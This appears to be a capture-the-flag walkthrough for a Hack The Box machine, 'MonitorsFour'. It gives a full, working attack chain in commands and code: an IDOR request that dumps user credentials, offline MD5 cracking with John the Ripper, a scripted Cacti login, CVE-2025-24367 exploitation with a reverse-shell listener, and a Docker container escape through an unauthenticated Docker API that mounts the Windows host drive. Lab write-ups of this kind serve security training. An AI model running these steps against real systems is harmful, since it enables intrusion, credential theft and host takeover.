Initial Access

Step 1 — IDOR: Leaking User Credentials

The main site at monitorsfour.htb exposes a /user endpoint that accepts a token parameter. Passing token=0 bypasses any access control and dumps the entire user table — a classic Insecure Direct Object Reference (IDOR):

bash
curl -s http://monitorsfour.htb/user?token=0

Step 2 — Cracking the Admin Hash

The admin MD5 hash is cracked offline using John the Ripper against the rockyou wordlist:

bash
echo '56b32eb43e6f15395f6c46c1c9e1cd36' > hashes.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
✓  Cracked: wonderful1 (admin / Marcus Higgins)
Step 3 — Cacti Authentication

The admin user "Marcus Higgins" maps to the Cacti username marcus. Login is confirmed via a Python session:

python
import requests, re

s = requests.Session()
res  = s.get('http://cacti.monitorsfour.htb/cacti/index.php')
csrf = re.search(r'var csrfMagicToken\s*=\s*"(sid:[a-z0-9]+,[a-z0-9]+)', res.text).group(1)
s.post('http://cacti.monitorsfour.htb/cacti/index.php', data={
    '__csrf_magic':    csrf,
    'action':          'login',
    'login_username': 'marcus',
    'login_password': 'wonderful1'
})
# Login successful - "You are now logged into"

Step 4 — CVE-2025-24367: Cacti Authenticated RCE
CVE-2025-24367
Cacti <= 1.2.28 — Authenticated Remote Code Execution via Graph Template Injection
Cacti allows authenticated users to inject newline characters into the right_axis_label field of graph templates. This abuses the underlying rrdtool binary invocation to write arbitrary PHP files into the Cacti web root, achieving unauthenticated webshell access and ultimately a reverse shell.

The public PoC by TheCyberGeek automates the full exploit chain:

bash
# Start reverse shell listener
nc -lvnp 4444

# Run exploit
python3 exploit.py -u marcus -p wonderful1 -i <YOUR_IP> -l 4444   -url http://cacti.monitorsfour.htb
output

Privilege Escalation — Docker Container Escape

With a shell inside the Docker container, the goal is to reach the Windows host filesystem. The Docker Desktop installation exposes an unauthenticated Docker API on the WSL2 internal network.

Step 1 — Network Enumeration
bash
ip addr
# eth0: 172.18.0.3/16

ip route
# default via 172.18.0.1
Step 2 — Discover Unauthenticated Docker API

The Docker Desktop WSL2 gateway at 192.168.65.7 exposes the Docker Engine API on port 2375 without any authentication:

bash
curl -s http://192.168.65.7:2375/version
output
Docker Engine 28.3.2 on 6.6.87.2-microsoft-standard-WSL2
⚠  The Docker API is completely unauthenticated — any process inside any container on this host can create, start, or inspect containers with full privileges.
Step 3 — List Available Images
bash
curl -s http://192.168.65.7:2375/images/json
Image
alpine:latest
docker_setup-nginx-php:latest
docker_setup-mariadb:latest
Step 4 — Create Privileged Container with Host Filesystem Mount

Using alpine:latest, a new container is created that mounts the Windows host C:\ drive at /host_root:

bash
curl -s -X POST "http://192.168.65.7:2375/containers/create?name=pwned"   -H "Content-Type: application/json"   -d '{
    "Image": "alpine:latest",
    "Cmd": ["cat", "/host_root/Users/Administrator/Desktop/root.txt"],
    "HostConfig": {
      "Binds": ["/mnt/host/c:/host_root"]
    }
  }'
output
{"Id":"793e65222c4d...","Warnings":[]}
Step 5 — Start Container and Read Root Flag
bash
# Start the container
curl -s -X POST http://192.168.65.7:2375/containers/793e65222c4d/start

# Read output logs (stdout of the cat command)
curl -s "http://192.168.65.7:2375/containers/793e65222c4d/logs?stdout=true"
